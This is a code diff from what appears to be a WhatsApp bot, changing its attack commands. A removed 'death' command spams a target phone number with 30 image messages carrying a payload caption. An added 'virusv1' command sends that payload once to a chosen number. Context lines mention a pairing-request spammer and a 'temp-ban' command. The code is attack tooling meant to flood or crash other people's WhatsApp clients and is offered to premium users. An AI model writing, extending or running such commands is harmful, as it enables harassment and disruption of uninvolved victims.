@@ -1168,18 +1168,12 @@ console.log('Finished. 15 minutes have passed');
 await spamPairingRequest(sanitizedPhoneNumber, attempts);*/
 }
 break;
-case 'death': {
-if (!isCreator) return reply(mess.owner)
-if (!isPremium) return reply(mess.prem)
-if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
-let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> Example : ${prefix + command} 2547392784527`)
-let target = bijipler + '@s.whatsapp.net'
-await reply(mess.bugrespon)
-for (let j = 0; j < 30; j++) {
-sam.sendMessage(target, {image: spider, caption: `${testing}`},
-{quoted:m})
-await sleep(2000)
+case 'virusv1': {
+if (!isPremium) return msg.reply('You are not premium ')
+if (!args[0]) return msg.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
+bnnd = text.split("|")[0]+'@s.whatsapp.net'
+sam.sendMessage(bnnd, { image: spider,  caption: `${testi}` }, { quoted:m })
+msg.reply(`Sukses Target Telah Di Kirim ${command}`)
 }
 break
 case 'temp-ban': {
